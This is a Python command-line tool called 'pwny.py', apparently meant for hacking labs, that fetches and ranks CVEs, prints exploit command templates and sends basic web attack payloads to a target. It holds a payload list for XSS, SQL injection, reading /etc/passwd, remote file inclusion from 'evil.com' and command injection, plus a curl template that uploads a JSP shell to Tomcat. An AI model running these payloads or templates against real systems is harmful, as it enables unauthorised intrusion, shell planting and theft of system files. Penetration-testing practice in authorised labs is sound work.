#!/usr/bin/env python3
"""
pwny.py - HTN Exploitation Helper

Modules:
  - CVE Fetcher: auto-fetch & rank CVEs for given product/version
  - Exploit Launcher: generate working exploit PoCs from templates
  - Web Vuln Tester: inject quick payloads for XSS, SQLi, LFI, RFI, CMDi

Usage examples:
  ./pwny.py cve apache 2.4.49
  ./pwny.py exploit tomcat_rce --target 10.10.10.10 --path testapp
  ./pwny.py webtest http://10.10.10.10/index.php
"""

import requests
import json
import os
import argparse
from datetime import datetime

# ============ CONFIG ============
USER_AGENT = "HTN-Exploitation-Helper/1.0"
CVE_API = "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch="

LOG_DIR = "logs"

EXPLOIT_TEMPLATES = {
    "tomcat_rce": "curl -s -X PUT http://{target}:8080/{path}/shell.jsp --data '{payload}'",
    "php_lfi": "curl 'http://{target}/index.php?page=../../../../etc/passwd'"
}

PAYLOADS = {
    "xss": "<script>alert(1)</script>",
    "sqli": "' OR '1'='1 -- ",
    "lfi": "../../../../etc/passwd",
    "rfi": "http://evil.com/shell.txt",
    "cmd_injection": ";id"
}

os.makedirs(LOG_DIR, exist_ok=True)


# ================= CVE FETCHER =================
def fetch_cves(product, version):
    url = f"{CVE_API}{product}%20{version}"
    r = requests.get(url, headers={"User-Agent": USER_AGENT})
    if r.status_code != 200:
        print(f"[!] Failed to fetch CVEs (status {r.status_code})")
        return []

    try:
        data = r.json()
        vulns = data.get("vulnerabilities", [])
        results = []

        for v in vulns:
            cve_id = v["cve"]["id"]
            summary = ""
            if "descriptions" in v["cve"]:
                for d in v["cve"]["descriptions"]:
                    if d.get("lang") == "en":
                        summary = d.get("value", "")
            cvss = 0
            vector = ""
            metrics = v.get("metrics", {})
            if "cvssMetricV31" in metrics:
                cvssData = metrics["cvssMetricV31"][0]["cvssData"]
                cvss = cvssData.get("baseScore", 0)
                vector = cvssData.get("vectorString", "")
            results.append({
                "id": cve_id,
                "summary": summary,
                "cvss": cvss,
                "cvss-vector": vector
            })

        return results
    except Exception as e:
        print(f"[!] Error parsing CVE response: {e}")
        return []




def rank_cves(cves):
    ranked = []
    for cve in cves:
        vector = cve.get("cvss-vector", "").lower()
        desc = cve.get("summary", "").lower()
        score = cve.get("cvss", 0)
        weight = score
        if "remote" in desc or "network" in vector:
            weight += 3
        if "auth" not in desc:
            weight += 2
        ranked.append((cve["id"], score, desc[:100], weight))
    return sorted(ranked, key=lambda x: x[3], reverse=True)


# ================= EXPLOIT LAUNCHER =================
def launch_exploit(template_name, **kwargs):
    if template_name not in EXPLOIT_TEMPLATES:
        return f"[!] No template found for {template_name}"
    return EXPLOIT_TEMPLATES[template_name].format(**kwargs)


# ================= WEB VULN TESTER =================
def test_web_vulns(target_url):
    results = []
    for vuln, payload in PAYLOADS.items():
        test_url = f"{target_url}?q={payload}"
        try:
            r = requests.get(test_url, timeout=5)
            out = {
                "vuln": vuln,
                "payload": payload,
                "status": r.status_code,
                "length": len(r.text),
                "detected": False
            }
            if vuln == "xss" and payload in r.text:
                out["detected"] = True
            elif vuln == "sqli" and "sql" in r.text.lower():
                out["detected"] = True
            elif vuln == "lfi" and "root:x:" in r.text:
                out["detected"] = True
            elif vuln == "cmd_injection" and "uid=" in r.text:
                out["detected"] = True

            results.append(out)
            log_result("webtest", out)
        except Exception as e:
            results.append({"vuln": vuln, "error": str(e)})
    return results


# ================= LOGGING =================
def log_result(module, data):
    ts = datetime.now().strftime("%Y%m%d-%H%M%S")
    filename = os.path.join(LOG_DIR, f"{module}-{ts}.json")
    with open(filename, "w") as f:
        json.dump(data, f, indent=4)


# ================= CLI =================
def main():
    parser = argparse.ArgumentParser(description="pwny.py - HTN Exploitation Helper")
    subparsers = parser.add_subparsers(dest="command", required=True)

    # CVE fetcher
    cve_parser = subparsers.add_parser("cve", help="Fetch and rank CVEs")
    cve_parser.add_argument("product", help="Product name (e.g., apache)")
    cve_parser.add_argument("version", help="Version (e.g., 2.4.49)")

    # Exploit launcher
    exploit_parser = subparsers.add_parser("exploit", help="Launch exploit template")
    exploit_parser.add_argument("template", help="Exploit template name")
    exploit_parser.add_argument("--target", help="Target IP/hostname")
    exploit_parser.add_argument("--path", default="", help="Path if required")
    exploit_parser.add_argument("--payload", default="pwned", help="Payload string")

    # Web vuln tester
    web_parser = subparsers.add_parser("webtest", help="Test web vulnerabilities")
    web_parser.add_argument("url", help="Target URL (e.g., http://10.10.10.10/index.php)")

    args = parser.parse_args()

    if args.command == "cve":
        print(f"[+] Fetching CVEs for {args.product} {args.version}...")
        cves = fetch_cves(args.product, args.version)
        ranked = rank_cves(cves)
        for c in ranked[:10]:
            print(f" {c[0]} | CVSS: {c[1]} | {c[2]}")

    elif args.command == "exploit":
        print(f"[+] Generating exploit for {args.template}...")
        cmd = launch_exploit(args.template, target=args.target, path=args.path, payload=args.payload)
        print(f"[CMD] {cmd}")

    elif args.command == "webtest":
        print(f"[+] Testing {args.url} for common vulns...")
        results = test_web_vulns(args.url)
        for r in results:
            if "error" in r:
                print(f" {r['vuln'].upper()}: ERROR - {r['error']}")
            else:
                status = "POSSIBLE" if r["detected"] else "Not detected"
                print(f" {r['vuln'].upper()}: {status} (HTTP {r['status']}, Len {r['length']})")


if __name__ == "__main__":
    main()
